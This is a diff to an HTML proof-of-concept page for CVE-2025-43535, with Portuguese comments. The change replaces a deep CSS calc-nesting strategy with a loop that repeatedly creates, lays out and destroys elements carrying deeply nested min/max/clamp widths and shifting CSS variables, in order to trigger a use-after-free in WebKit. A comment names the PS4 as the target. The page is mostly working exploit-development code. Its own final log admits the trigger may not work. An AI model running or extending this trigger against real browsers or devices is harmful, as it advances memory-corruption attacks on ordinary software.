@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-43535 PoC — Profundidade Extrema</title>
+<title>CVE-2025-43535 PoC — UAF Churning</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px;
@@ -11,7 +11,7 @@
 </style>
 </head>
 <body>
-<h3>CVE-2025-43535 — Memory Corruption (Bypass de Limite JS)</h3>
+<h3>CVE-2025-43535 — Memory Churning (Caçando o UAF)</h3>
 <div id="log"></div>
 
 <script>
@@ -22,90 +22,80 @@ const L=(m,c)=>{const d=document.getElementById('log');
   d.scrollTop=d.scrollHeight;
 };
 
-const yieldGC = () => new Promise(r => setTimeout(r, 150));
+// Nesta estratégia, pausas são curtas apenas para evitar freeze da UI, 
+// pois QUEREMOS que o Garbage Collector se atropele
+const yieldRace = () => new Promise(r => setTimeout(r, 0)); 
 
-async function variant1_css_calc_deep() {
-  L("[V1] Iniciando (Estratégia Híbrida)...");
+async function trigger_uaf_churn() {
+  L("[V1] Gerando payload matemático seguro (Nível 22)...");
 
-  const el = document.createElement('div');
-  el.style.cssText = 'position:absolute;top:-9999px';
-  document.body.appendChild(el);
-
+  // Mantemos o cache para não gastar CPU do JS, queremos estressar o C++
   const mathCache = {};
-
-  // Geração Híbrida: Agressiva na base, Profunda no topo
   function makeMathNested(depth) {
-    if (depth <= 0) return '10px';
+    if (depth <= 0) return 'var(--dyn-val, 10px)'; // Introduzindo variável dinâmica
     if (mathCache[depth]) return mathCache[depth];
 
     const funcs = ['min', 'max', 'clamp'];
     const f = funcs[depth % 3];
     let result = '';
 
-    // Crescimento Exponencial Original (Agressivo)
-    if (depth <= 24) {
-      if (f === 'clamp') {
-        result = `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
-      } else {
-        result = `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
-      }
-    } 
-    // Crescimento Linear (Fura-Teto)
-    else {
-      // Ao invés de duplicar a árvore do d-1, fixamos um lado.
-      // Isso empurra a pilha de execução do C++ para o fundo sem dobrar a RAM!
-      if (f === 'clamp') {
-        result = `clamp(${makeMathNested(depth-1)}, ${depth*5}px, 10px)`;
-      } else {
-        result = `${f}(${makeMathNested(depth-1)}, 10px)`;
-      }
+    if (f === 'clamp') {
+      result = `clamp(${makeMathNested(depth-1)}, ${depth*5}px, ${makeMathNested(depth-2 < 0 ? 0 : depth-2)})`;
+    } else {
+      result = `${f}(${makeMathNested(depth-1)}, ${makeMathNested(depth-1)})`;
     }
 
     mathCache[depth] = result;
     return result;
   }
 
-  // FASE 1: Aquecimento Agressivo
-  L("[V1] Carregando Base Agressiva 24 no C++...");
-  try {
-    el.style.width = makeMathNested(24);
-    void el.offsetWidth;
-    L(`[V1] Base 24 carregada com sucesso!`, "ok");
-  } catch(e) {
-    L(`[V1] Erro na base: ${e}`, "fail");
-  }
-  
-  el.style.width = '10px';
-  await yieldGC();
+  // Nível 22 é seguro e não causa OOM no PS4, mas é complexo o suficiente para o parser
+  const safePayload = makeMathNested(22); 
+  const container = document.createElement('div');
+  document.body.appendChild(container);
 
-  L("[V1] Rompendo a barreira do 27. Subindo até o 60...");
+  L("[V1] Iniciando ciclo de Memory Churning (Criar -> Layout -> Destruir)...");
 
-  // FASE 2: Furando o teto do JavaScriptCore
-  // Agora podemos ir MUITO além do 27 sem dar falta de memória no JS
-  for (let d = 25; d <= 60; d++) {
+  // Fazemos 200 ciclos de alocação/liberação agressiva
+  for (let ciclo = 0; ciclo < 200; ciclo++) {
     try {
-      L(`[V1] Injetando profundidade ${d}...`);
-      await new Promise(r => requestAnimationFrame(r)); 
+      // 1. Cria 5 elementos simultâneos
+      for (let i = 0; i < 5; i++) {
+        let el = document.createElement('div');
+        el.style.position = 'absolute';
+        // Alterna variáveis CSS no meio do cálculo para confundir o resolver
+        el.style.setProperty('--dyn-val', (ciclo % 2 === 0) ? '15px' : '5vw');
+        el.style.width = safePayload; 
+        container.appendChild(el);
+      }
+
+      // 2. Força o WebKit (C++) a processar toda a matemática AGORA
+      void container.offsetWidth; 
+
+      // 3. Destrói tudo imediatamente enquanto o C++ ainda pode estar lidando com nós internos
+      container.innerHTML = ''; 
       
-      el.style.width = makeMathNested(d);
-      void el.offsetWidth; // Força o WebKit a montar a árvore
-      L(`[V1] Profundidade ${d} sobreviveu!`, "ok");
+      // 4. Força um novo layout na árvore vazia
+      void container.offsetWidth;
+
+      if (ciclo % 20 === 0) {
+        L(`[V1] Ciclo de agitação ${ciclo}/200 concluído.`);
+        await yieldRace(); // Respiro microscópico
+      }
     } catch(e) {
-      L(`[V1] Exceção na profundidade ${d}: ${e}`, "fail");
+      L(`[V1] Exceção no ciclo ${ciclo}: ${e}`, "fail");
     }
-    
-    el.style.width = '10px';
-    await yieldGC(); 
   }
 
-  document.body.removeChild(el);
-  L("[V1] Escala Extrema Finalizada", "ok");
+  document.body.removeChild(container);
+  L("[V1] Churning Finalizado. Se o WebKit tem um UAF aqui, ele deve cair agora.", "ok");
 }
 
 async function main() {
   try {
-    await variant1_css_calc_deep();
+    await trigger_uaf_churn();
     L("=== FIM DA EXECUÇÃO ===", "ok");
+    L("Caso não crashe, o trigger exato do CVE pode depender das Variantes 3 ou 4 originais.", "info");
   } catch(e) {
     L("EXCEÇÃO FATAL: " + e.toString(), "fail");
   }
